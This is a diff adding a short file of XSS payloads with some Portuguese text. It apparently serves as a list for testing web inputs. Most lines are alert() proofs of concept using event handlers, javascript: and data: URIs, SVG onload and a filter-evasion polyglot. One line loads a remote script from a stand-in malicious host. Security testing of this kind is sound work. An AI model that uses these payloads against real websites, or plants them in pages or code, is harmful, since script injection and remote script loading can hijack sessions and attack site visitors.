@@ -1,0 +1,15 @@
+<img src="x" onerror="alert('XSS')">
+<a href="javascript:alert('XSS')">Clique aqui</a>
+<div onmouseover="alert('XSS')">Passe o mouse sobre mim</div>
+<script>alert("XSS")</script>
+"><script>alert(1)</script>
+<input type="text" value="XSS" onfocus="alert('XSS')">
+"><img src=x onerror=alert("XSS")>
+'><script>alert(1)</script>
+<iframe src="javascript:alert('XSS')">
+<img src=x onerror=alert("XSS")>
+<svg/onload=prompt(1)>
+<script src="https://site-malicioso.com/ataque.js"></script>
+<marquee><h1>XSS</h1></marquee>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Clique aqui</a>
+'';!--"<XSS>=&{()}
